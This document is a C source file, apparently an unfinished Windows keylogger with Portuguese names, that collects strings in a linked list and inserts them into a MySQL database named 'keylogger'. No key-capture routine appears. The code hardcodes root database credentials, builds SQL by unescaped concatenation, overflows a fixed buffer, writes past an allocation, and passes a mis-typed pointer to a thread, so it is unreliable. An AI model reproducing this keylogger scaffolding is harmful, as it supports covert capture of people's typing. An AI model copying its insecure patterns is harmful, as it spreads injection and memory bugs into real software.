#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <stdbool.h>
#include <string.h>
#include "mysql.h"
#define SERVIDOR "localhost"
#define USUARIO "root"
#define SENHA "abzdwe123"
#define BD "keylogger" 
#define __STDC_WANT_LIB_EXT1__ 1
struct lista {
	char* info;
	size_t length;
	struct lista* prox;
};

void log(struct lista*);
struct lista* inserir(struct lista* lst, char* info);
char* toString(struct lista* lst);

void log(struct lista* lst) {
	char* sql = (char*)malloc(sizeof(char) * 500);
	strcpy(sql, "insert into logs (date,value) values (now(), \"");
	char* texto = toString(lst);

	strcat(sql, texto);
	strcat(sql, "\")");
	MYSQL conexao;
	mysql_init(&conexao);
	int res = 0;
	if (mysql_real_connect(&conexao, SERVIDOR, USUARIO, SENHA, BD, 0, NULL, 0)) {
		printf("Conexao bem sucedida\n");
		res = mysql_query(&conexao, sql);
		if (!res) {
			printf("inseriu\n");
		}
		mysql_close(&conexao);
	}
	free(sql);
	//free(texto);
	//free(&conexao);
	
}

int iniciaLog(char* argv[]) {
	HANDLE thread;

	thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)log,
		(LPVOID)argv[0], 0, NULL);

	if (thread)
	{
		return WaitForSingleObject(thread, INFINITE);
	}
	return 1;
	
}

struct lista* inserir(struct lista* lst, char* info) {
	struct lista* aux = (struct lista*) malloc(sizeof(struct lista));
	aux->info = info;
	aux->length = strlen(info);
	aux->prox = NULL;
	if (lst == NULL) {
		return aux;
	}
	else {
		struct lista* aux2 = lst;
		while (aux2->prox != NULL) {
			aux2 = aux2->prox;
		}
		aux2->prox = aux;
		return lst;
	}
}

char* toString(struct lista* lst) {
	struct lista* aux = lst;
	size_t tamanho = 0;
	while (aux != NULL) {
		//obtem o tamanho para alocar a quantidade correta para a string
		tamanho += aux->length;
		aux = aux->prox;
	}

	char *retorno = (char*)malloc(sizeof(char) * tamanho);
	int sizee = sizeof(char);
	aux = lst;
	int i = 0;
	while (aux != NULL) {
		int j = 0;
		while (j < aux->length) {
			retorno[i] = aux->info[j];
			i++;
			j++;
		}
		aux = aux->prox;
	}
	retorno[tamanho] = '\0';
	return retorno;
}